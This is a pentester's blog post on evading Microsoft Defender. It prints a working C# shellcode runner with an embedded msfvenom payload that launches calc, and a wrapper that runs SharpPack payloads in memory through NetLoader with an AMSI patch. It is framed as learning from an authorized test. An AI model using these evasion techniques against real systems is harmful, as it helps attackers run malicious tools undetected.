---
title: How to bypass Defender in a few easy steps
categories: [blog]
classes: wide
toc: true
excerpt: "What one can learn about AV bypass during a pentest!"
---

In a recent pentest I had the opportunity to spend a bit of time in a windows VM in an AD environment via RDP to test their hardening. Along the way, from very basic techniques to some more advanced ones, I learned a lot about DotNet, how antivirus engines work, and how to bypass them. I did manage to bypass Defender in the pentest, and run some nice stuff, and wanted to make a blog post for people who like me a few days ago had very little experience with bypassing antivirus software. Enjoy your stay :)

# Basics of how AV works

Before we dive in in which solutions I tried, let's recap a bit on how AV works with files on disk (no AI, basics):
+ signature detection
+ heuristics detection
+ in memory detection

## Signatures

The basic functionality and earliest one was to compare the hash of a file, or part of a file, with hashes of known malicious files. This can be the hash of the whole file, or just from a few bytes or strings that are at the core of the malicious activity.

## Heuristics

The next level in antivirus school when signatures or not enough, is thinking about emulating the executable that wants to run *before* it is actually run. That means going through the assembly instructions or lines of code, and checking what happens when they are run. Based on the behaviour observed, the AV can decide a file is malicious and not allow the file to run after having been emulated.

## What happens when stuff is not on disk?

One last important thing to mention is AMSI: the response of Microsoft to malicious software not even touching the disk. When an executable on disk is run, it is scanned/emulated before being allowed to run, but what happens if that executable is already in memory and loaded from somewhere else? AMSI is a Windows API that allows developers of software that allows execution of scripts for example (think PowerShell, VBA macros in Office, reflection for C# assembly) to request an AMSI scan before letting the thing in memory run.

# First approach: Changing strings and obfuscation

So let's try to bypass the first layer of AV: signature detection. My first attempt was to run my C# SharpHound.exe for example through [DefenderCheck](https://github.com/matterpreter/DefenderCheck), [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1), and manual scans on [AntiScan.me](https://antiscan.me/) and [VirusTotal](https://www.virustotal.com/gui/) to try to find out what part of the code was triggering the AV software. Through trial and error, and going through smaller and smaller parts of the file, you can find out what strings trigger AV to refactor those string in Visual Studio, or change individual bytes of the executable. The downside of the last method is that it will most likely break the executable as assembly instructions are overwritten, and needs reverse engineering to figure out what exactly was changed and whether it can be fixed, which takes time and effort staring at disassembled binary code. Not great, we're lazy, and we'd have to do that for each AV software we want to bypass. Meh.

Another method, try to change the code so much that it doesn't look like anything anymore. I mean, try to obfuscate the code. Such tools as [ConfuserEx](https://github.com/mkaring/ConfuserEx) can do this for .Net applications. This works to a certain extent, and could have been enough some years ago, but nowadays still doesn't bypass any heuristics detection. Well, it was worth a try.

# Second approach: Homemade C# runner

My next attempt shames me a bit. But here's what I tried: I knew of shellcode runners to execute msfvenom generated payloads in C# thanks to WinAPI calls. The basic runner code looks like this:

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.IO;

namespace Shellcode_Runner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreatingFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -a x64 -f base64
            string b64_payload = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
            byte[] buf = System.Convert.FromBase64String(b64_payload);

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            Thread.Sleep(10000);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

And little me thought, well if I can run shellcode with it, why not try to load the whole EXE file in base64 and have it executed like shellcode. I mean why wouldn't it work? :D Obviously, I noticed after a few failed attempts that EXE and especially C# compiled EXE were **not** shellcode, and that *obviously* loading the whole EXE to be executed as assembly instructions would not work, just because of the PE headers, never mind how C# is actually compiled, I remembered some time into trying that it was a managed languaged and compiled into intermediary code... Even my efforts to transform it to shellcode with [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode) which changes the PE header to be executable (obviously not gonna work with C# still) or [Donut](https://github.com/TheWover/donut) (which should have worked? no idea why not) did not bring any fruit. 

BUT, I wrote a shellcode runner! The next step would have been to work on escaping signature detection by encrypting the payload, and heuristics detection by messing with our behaviour (which will be the subject of another blog post probably where I focus on bypassing AV for shellcode without the solution I ended up using here). So, onto my next attempt.

# Third approach: Payload delivery 

So if I can't obfuscate enough a C# executable, or go around the heuristics analysis by running it as shellcode, maybe there's another way to not touch the disk. I had used [NetLoader](https://github.com/Flangvik/NetLoader) before during the CRTE bootcamp, without really understanding what it did and what it was for, but let's dive in (a bit) now:

NetLoader is a C# tool that loads C# assembly from a path, URL, or SMB share via reflection (a topic for another blog post problaby, but see it as a shellcode runner but for C# assembly) and patches AMSI to bypass it. This means that the malicious C# executable doesn't have to touch the disk at all, which is a good thing for us, and as it bypasses AMSI (another topic for a later blogpost), this could mean bypassing Defender completely. The only thing is, will it be allowed to run? Well, apparently Microsoft hasn't added a signature for NetLoader, because it is!

First success: running any malicious C# executable!
![SharpHound.exe run successfully]({{site.url}}/assets/images/run_exe.png)

But that wasn't enough for me, I wanted to be able to run PowerShell scripts as well... but that didn't work with NetLoader, so onto another tool for payload delivery and AMSY bypass, [SharpPack](https://github.com/mdsecactivebreach/SharpPack):

SharpPack needed a bit of refactoring for my purposes, as the project compiles to a DLL by default, which makes sense for more opsec safe ways, like [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) or in an Office VBA macro, as described in [this](https://www.mdsec.co.uk/2018/12/sharppack-the-insider-threat-toolkit/) blog post, but I just wanted a normal C# executable that I would then run with NetLoader.

I changed the project to compiling to an exe, and added a main:

```csharp
using System;
using SharpPack;

namespace SharpPackRunner
{
    class Program
    {
        static void usage()
        {
            System.Console.WriteLine("Usage: SharpPackRunner.exe -D/-P <encpath> <encpass> <outfile> <name> <args>");
            return;
        }
        static void Main(string[] args)
        {
            if (args.Length != 6)
            {
                usage();
                return;
            }

            var sp = new SharpPackClass();
            if (String.Equals(args[0], "-D"))
                sp.RunDotNet(args[1], args[2], args[3], args[4], args[5]);
            else if (String.Equals(args[0], "-P"))
                sp.RunPowerShell(args[1], args[2], args[3], args[4], args[5]);
            else
                usage();
        }
    }
}
```
(I was looking for a more elegant solution like unpacking an array into arguments like `*array` in python, but apparently this is not possible in C# without refactoring the method)

So I ended up with a C# executable that I could run with NetLoader, and that can extract a C# malicious executable or PowerShell script from an encrypted zip file, run it, and send the output to a text file. The code can probably be changed to load executables and scripts from a URL or share like NetLoader and show the output instead of sending it to a text file so that nothing is on disk at all, but it didn't have that much time to dive into the source code to be honest. 

I added a line at the end of the SharpHound.ps1 script with `Invoke-BloodHound -CollectionMethod All` to load and run SharpHound (although reading MDSec's blogpost again I could have given that line as the last argument to SharpPack probably), and could now run PowerShell scripts!

![SharpHound.ps1 run successfully]({{site.url}}/assets/images/run_powershell.png)

My quest was complete!

# Conclusion

I did manage to bypass Defender, and I learned a lot of things about antivirus software in the process, but I didn't dive very deep into bypassing AMSI and the reflection mechanism in C#, which could be the topics of future blog posts. I hope this post was clear enough, if I made any mistake in explaining, let me know in an issue or on Discord (arty-hlr#1427)!
